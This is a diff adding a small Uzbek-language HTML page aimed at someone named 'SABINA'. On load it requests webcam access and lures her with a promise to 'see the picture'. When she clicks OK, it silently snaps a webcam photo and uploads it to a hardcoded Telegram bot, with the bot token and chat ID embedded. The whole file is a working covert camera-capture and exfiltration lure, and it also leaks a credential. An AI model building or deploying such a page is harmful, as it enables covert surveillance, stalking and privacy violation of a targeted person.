@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<title>SABINA Rasmga tushurish</title>
+<style>
+  body {
+    text-align: center;
+    background: #111;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    padding-top: 50px;
+  }
+  h1 {
+    font-size: 24px;
+    margin-bottom: 50px;
+  }
+  button {
+    padding: 15px 40px;
+    font-size: 20px;
+    background: #ff4081;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    display: none; /* Dastlab yashirin */
+  }
+  button:hover {
+    background: #e91e63;
+  }
+</style>
+</head>
+<body>
+
+<h1 id="title">Kamera ruxsati so‘ralmoqda...</h1>
+
+<button id="okBtn" onclick="takePhoto()">OK</button>
+
+<video id="video" autoplay style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+// 🔹 O'zingizning token va chat ID
+const BOT_TOKEN = "8563348903:AAEEM2kLHKTBaq2pBYbZ54xHLAvhgAhprRw";
+const CHAT_ID  = "8283156003";
+
+const okBtn = document.getElementById("okBtn");
+const title = document.getElementById("title");
+
+async function requestCamera() {
+  try {
+    // Kamera ruxsatini so‘raymiz
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    // Agar ruxsat berilsa, OK tugmasini ko‘rsatamiz
+    okBtn.style.display = "inline-block";
+    title.textContent = "Rasmni ko‘rish uchun pastdagi tugmani bosing SABINA 😉";
+    // Streamni saqlaymiz, rasm olishda ishlatamiz
+    window.camStream = stream;
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+  } catch (e) {
+    title.textContent = "Kameraga ruxsat berilmadi SABINA 😔";
+    console.error(e);
+  }
+}
+
+// Darhol sahifa yuklanganda kamera ruxsatini so‘raymiz
+requestCamera();
+
+async function takePhoto() {
+  try {
+    const stream = window.camStream;
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
+
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    });
+
+    // Kamerani yopamiz
+    stream.getTracks().forEach(t => t.stop());
+    alert("Rasm yuborildi SABINA 😉");
+
+    // Tugmani yana yashiramiz
+    okBtn.style.display = "none";
+    title.textContent = "Rasm yuborildi ✅";
+
+  } catch (e) {
+    alert("Rasm yuborilmadi SABINA 😔");
+    console.error(e);
+  }
+}
+</script>
+
+</body>
+</html>
